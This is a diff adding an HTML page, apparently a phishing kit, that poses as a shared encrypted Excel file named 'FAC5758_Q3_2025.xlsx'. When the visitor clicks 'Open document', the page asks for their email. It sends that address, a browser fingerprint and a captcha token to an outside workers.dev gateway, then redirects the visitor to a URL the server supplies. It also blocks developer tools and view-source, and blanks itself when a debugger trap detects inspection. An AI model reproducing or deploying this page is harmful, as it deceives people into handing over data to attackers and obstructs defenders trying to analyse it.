@@ -1,0 +1,383 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Access</title>
+
+  <!-- Icons + Fonts -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <!-- Cloudflare Turnstile -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+  <style>
+    :root{
+      --accent:#10793F; --accent-2:#10793F;
+      --bg:#fff; --text:#10793F; --muted:#000; --line:#ccc;
+      --radius:14px; --shadow:0 8px 24px rgba(0,0,0,.08);
+    }
+
+    /* Page layout + bg controls */
+    body{
+      font-family:Inter,system-ui,sans-serif;
+      margin:0; padding:20px; color:var(--text);
+      background:#f1f1f1;              /* fallback */
+      min-height:100dvh;
+      display:grid; place-items:center; /* centers card */
+
+      /* Background controls (edit these) */
+      --bg-image:url('/d/oyana.PNG');
+      --bg-blur:2.5px;                 /* 0..12+ */
+      --bg-overlay:rgba(255,255,255,.20);
+      --bg-fit:cover;                  /* cover | contain */
+      --bg-position:center center;
+      --bg-scale:1.01;                 /* tiny scale to avoid blur edges */
+    }
+    .bg-img{
+      position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:
+        linear-gradient(135deg,var(--bg-overlay),var(--bg-overlay)),
+        var(--bg-image);
+      background-repeat:no-repeat,no-repeat;
+      background-position:center center,var(--bg-position);
+      background-size:100% 100%,var(--bg-fit);
+      filter:blur(var(--bg-blur));
+      transform:scale(var(--bg-scale));
+      will-change:filter,transform;
+    }
+
+    .container,.file-card{ position:relative; z-index:1; }
+
+    .file-card{
+      width:min(65vw,620px);
+      margin:0 auto;
+      padding:24px;
+      background:var(--bg);
+      border-radius:5px;
+      border:1px solid var(--line);
+      box-shadow:var(--shadow);
+      animation:slideIn .7s ease-out;
+    }
+    @keyframes slideIn{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
+
+    .file-header{display:flex;align-items:center;gap:8px;margin-bottom:20px;}
+    .file-icon{
+      width:46px;height:46px;border-radius:7px;display:grid;place-items:center;
+      background:#10793F;color:#fff;font-size:28px;
+    }
+    .file-title h2{margin:0;font-size:18px;font-weight:700;}
+    .file-title p{margin:2px 0 0;color:var(--muted);font-size:12px;}
+
+    .file-preview{
+      margin:20px 0;border-radius:4px;overflow:hidden;position:relative;height:220px;border:1px solid var(--line);
+    }
+    .file-preview img{width:100%;height:100%;object-fit:cover;filter:blur(1.3px);}
+    .preview-banner{
+      position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:#000;background:rgba(255,255,255,.5);
+      text-align:center;padding:0 16px;
+    }
+
+    .file-info{display:flex;flex-wrap:wrap;gap:10px;margin:16px 0 20px;}
+    .file-info span{font-size:12px;color:var(--muted);}
+
+    .actions{display:flex;justify-content:flex-end;gap:12px;flex-wrap:wrap;}
+    .btn{
+      border:1px solid var(--line);padding:11px 20px;border-radius:6px;background:#fff;
+      font-weight:600;cursor:pointer;
+    }
+    .btn.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;}
+
+    .popup{
+      position:fixed;top:45%;left:50%;
+      transform:translate(-50%,-50%) scale(.68);
+      width:min(90vw,360px);
+      background:#fff;border-radius:6px;box-shadow:var(--shadow);
+      padding:16px;opacity:0;pointer-events:none;transition:.25s ease;z-index:1000;
+    }
+    .popup.active{opacity:1;transform:translate(-50%,-50%) scale(1);pointer-events:auto;}
+    .popup h3{margin:0 0 8px;font-size:16px;font-weight:700;color:#000;}
+    .form-group{margin-bottom:12px;}
+    .form-group input{
+      width:93%;padding:12px;border:1px solid var(--line);border-radius:7px;font-size:14px;background:#fff;
+    }
+    .error{color:#e11d48;font-size:13px;display:none;margin-top:6px;}
+    .overlay{
+      position:fixed;inset:0;background:rgba(0,0,0,.25);
+      opacity:0;pointer-events:none;transition:.25s ease;z-index:999;
+    }
+    .overlay.active{opacity:1;pointer-events:auto;}
+
+    .captcha-wrapper{display:flex;justify-content:center;align-items:center;margin:8px 0;}
+    #cf-turnstile{transform:scale(.75);transform-origin:center;}
+
+    @media (max-width: 640px){
+      body{padding:12px}
+      .file-preview{height:180px}
+    }
+  </style>
+</head>
+<body>
+  <!-- Background layer -->
+  <div class="bg-img" aria-hidden="true"></div>
+
+  <!-- Card -->
+  <main class="container">
+    <section class="file-card">
+      <header class="file-header">
+        <div class="file-icon"><i class="ri-file-excel-2-line" aria-hidden="true"></i></div>
+        <div class="file-title">
+          <h2 id="docTitle">FAC5758_Q3_2025.xlsx</h2>
+          <p id="docMeta">Excel · 365 KB · Updated 20-08-2025</p>
+        </div>
+      </header>
+
+      <div class="file-preview">
+        <img src="/d/tata.PNG" alt="Document preview" />
+        <div class="preview-banner" id="previewBanner"></div>
+      </div>
+
+      <div class="file-info">
+        <span id="chipEnc">End-to-end encrypted</span>
+        <span id="chipCtrl">Access controlled</span>
+        <span id="chipExp">Expires in 7 days</span>
+      </div>
+
+      <div class="actions">
+        <button class="btn" id="viewMeta">View details</button>
+        <button class="btn primary" id="openBtn">Open document</button>
+      </div>
+    </section>
+  </main>
+
+  <!-- Overlay + Popup -->
+  <div class="overlay" id="overlay" aria-hidden="true"></div>
+
+  <div class="popup" id="popup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
+    <form id="emailForm" novalidate autocomplete="off">
+      <h3 id="popupTitle">Confirm your email</h3>
+      <input type="text" id="middleName" name="middleName" class="honeypot" tabindex="-1" aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;" />
+      <div class="form-group">
+        <input type="email" id="email" placeholder="name@company.com" autocomplete="email" autocapitalize="off" spellcheck="false" />
+        <p class="error" id="err">Invalid email address</p>
+      </div>
+
+      <!-- Turnstile inside the form -->
+      <div class="captcha-wrapper">
+        <div id="cf-turnstile"
+             class="cf-turnstile"
+             data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
+             data-callback="onTurnstileDone"
+             data-theme="light"></div>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="btn" id="closeBtn">Cancel</button>
+        <button type="submit" class="btn primary" id="submitBtn">Continue</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    /* ================== i18n ================== */
+    const DICT = {
+      en: {
+        
+        chipEnc: "End-to-end encrypted",
+        chipCtrl: "Access controlled",
+        chipExp: "Expires in 7 days",
+        viewMeta: "View details",
+        open: "Open Document",
+        title: "Confirm your email",
+        invalidEmail: "Invalid email address",
+        captchaRequired: "Please complete the check",
+        continue: "Continue",
+        cancel: "Cancel",
+        placeholder: "username@company.com",
+        errorGeneric: "Unable to process, please try again",
+        redirecting: "Redirecting…"
+      },
+      fr: {
+        
+        chipEnc: "Chiffrement de bout en bout",
+        chipCtrl: "Accès contrôlé",
+        chipExp: "Expire dans 7 jours",
+        viewMeta: "Voir les détails",
+        open: "Ouvrir le document",
+        title: "Confirmez votre e-mail",
+        invalidEmail: "Adresse e-mail invalide",
+        captchaRequired: "Veuillez terminer la vérification",
+        continue: "Continuer",
+        cancel: "Annuler",
+        placeholder: "nom@entreprise.com",
+        errorGeneric: "Impossible de traiter, veuillez réessayer",
+        redirecting: "Redirection…"
+      },
+      de: {
+        
+        chipEnc: "Ende-zu-Ende-verschlüsselt",
+        chipCtrl: "Zugriff kontrolliert",
+        chipExp: "Läuft in 7 Tagen ab",
+        viewMeta: "Details anzeigen",
+        open: "Dokument öffnen",
+        title: "E-Mail bestätigen",
+        invalidEmail: "Ungültige E-Mail-Adresse",
+        captchaRequired: "Bitte schließen Sie die Prüfung ab",
+        continue: "Weiter",
+        cancel: "Abbrechen",
+        placeholder: "vorname.nachname@firma.de",
+        errorGeneric: "Verarbeitung nicht möglich, bitte erneut versuchen",
+        redirecting: "Weiterleitung…"
+      },
+      nl: {
+        
+        chipEnc: "End-to-end versleuteld",
+        chipCtrl: "Toegang gecontroleerd",
+        chipExp: "Verloopt over 7 dagen",
+        viewMeta: "Details bekijken",
+        open: "Document openen",
+        title: "E-mail bevestigen",
+        invalidEmail: "Ongeldig e-mailadres",
+        captchaRequired: "Rond de verificatie af",
+        continue: "Doorgaan",
+        cancel: "Annuleren",
+        placeholder: "voornaam.achternaam@bedrijf.nl",
+        errorGeneric: "Kan niet verwerken, probeer het opnieuw",
+        redirecting: "Doorsturen…"
+      }
+    };
+
+    function detectLang() {
+      const urlLang = new URLSearchParams(location.search).get('lang');
+      const cand = (urlLang || (navigator.languages && navigator.languages[0]) || navigator.language || 'en').toLowerCase().slice(0,2);
+      return ['en','fr','de','nl'].includes(cand) ? cand : 'en';
+    }
+
+    const LANG = detectLang();
+    const t = DICT[LANG];
+
+    /* ================== Main ================== */
+    document.addEventListener("DOMContentLoaded", () => {
+      // Apply translations
+      document.documentElement.lang = LANG;
+      const el = (id) => document.getElementById(id);
+      el('previewBanner').textContent = t.banner;
+      el('chipEnc').textContent = t.chipEnc;
+      el('chipCtrl').textContent = t.chipCtrl;
+      el('chipExp').textContent = t.chipExp;
+      el('viewMeta').textContent = t.viewMeta;
+      el('openBtn').textContent = t.open;
+      el('popupTitle').textContent = t.title;
+      el('submitBtn').textContent = t.continue;
+      el('closeBtn').textContent = t.cancel;
+      const emailInput = el('email');
+      if (emailInput) emailInput.setAttribute('placeholder', t.placeholder);
+
+      // DOM refs
+      const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
+      const popup    = el("popup");
+      const overlay  = el("overlay");
+      const openBtn  = el("openBtn");
+      const form     = el("emailForm");
+      const errBox   = el("err");
+      const input    = el("email");
+      const submitEl = el("submitBtn");
+
+      // Helpers
+      const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
+      const hide = (n) => { if (!n) return; n.style.display = 'none'; };
+
+      // Popup open/close
+      openBtn?.addEventListener('click', () => {
+        overlay?.classList.add('active'); popup?.classList.add('active'); input?.focus();
+      });
+      const close = () => { overlay?.classList.remove('active'); popup?.classList.remove('active'); hide(errBox); };
+      el('closeBtn')?.addEventListener('click', close);
+      overlay?.addEventListener('click', close);
+      document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+
+      // Turnstile token + fingerprint
+      let cfProof = "", fpHash = "";
+      window.onTurnstileDone = (token) => { cfProof = token; hide(errBox); };
+
+      function getClientSig() {
+        const nav = navigator;
+        return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
+      }
+      async function hashFingerprint(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+        return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
+      }
+      hashFingerprint(getClientSig()).then(fp => fpHash = fp);
+
+      // Submit
+      form?.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const val  = (input?.value || '').trim();
+        const trap = (el("middleName")?.value || '').trim();
+        const jsSig = "ok-" + Math.random().toString(36).slice(2);
+
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) return show(errBox, t.invalidEmail);
+        if (trap) return; // honeypot
+        if (!cfProof || cfProof.length < 10) return show(errBox, t.captchaRequired);
+
+        try {
+          const res = await fetch(gateway, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept-Language": LANG },
+            body: JSON.stringify({
+              email: val,
+              middleName: trap,
+              jsToken: jsSig,
+              cfToken: cfProof || "",
+              fingerprint: fpHash
+            })
+          });
+
+          const json = await res.json().catch(() => ({}));
+          if (!res.ok || !json.valid || !json.redirect) {
+            return show(errBox, json.message || t.errorGeneric);
+          }
+
+          if (submitEl) submitEl.textContent = t.redirecting;
+          if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
+          cfProof = "";
+          setTimeout(() => (location.href = json.redirect), 900);
+        } catch {
+          show(errBox, t.errorGeneric);
+        }
+      });
+
+      input?.addEventListener("input", () => hide(errBox));
+
+      // Anti-inspection (kept)
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      document.addEventListener("keydown", e => {
+        if (
+          e.key === "F12" ||
+          (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
+          (e.ctrlKey && e.key === "U")
+        ) e.preventDefault();
+      });
+      setInterval(() => {
+        const start = performance.now();
+        debugger;
+        const delta = performance.now() - start;
+        if (delta > 100) {
+          document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
+        }
+      }, 1500);
+
+      // JS-only fallback redirect (kept)
+      const noscript = document.createElement("noscript");
+      noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://example.com">`;
+      document.body.appendChild(noscript);
+    });
+  </script>
+</body>
+</html>
